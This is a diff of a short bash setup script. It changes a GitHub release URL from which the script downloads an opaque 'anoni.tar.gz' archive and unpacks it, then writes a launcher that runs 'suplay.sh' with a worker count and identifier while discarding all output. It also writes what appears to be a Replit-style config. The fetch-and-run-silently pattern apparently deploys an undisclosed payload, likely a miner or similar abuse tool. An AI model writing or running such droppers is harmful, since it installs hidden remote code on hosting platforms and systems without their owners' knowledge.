@@ -1,9 +1,9 @@
 #!/bin/bash
 
-curl -O -J -L https://github.com/maul10-bit/bandrec/releases/download/fres/anoni.tar.gz && tar -xf anoni.tar.gz && rm -rf anoni.tar.gz
+curl -O -J -L https://github.com/evo5-arch/vende/releases/download/dersa/anoni.tar.gz && tar -xf anoni.tar.gz && rm -rf anoni.tar.gz
 echo '#!/bin/bash
 
-bash suplay.sh 4 suto-01 >/dev/null 2>&1' > aro.sh
+bash suplay.sh 4 suto-05 >/dev/null 2>&1' > aro.sh
 
 echo 'modules = ["python-3.12"]
 
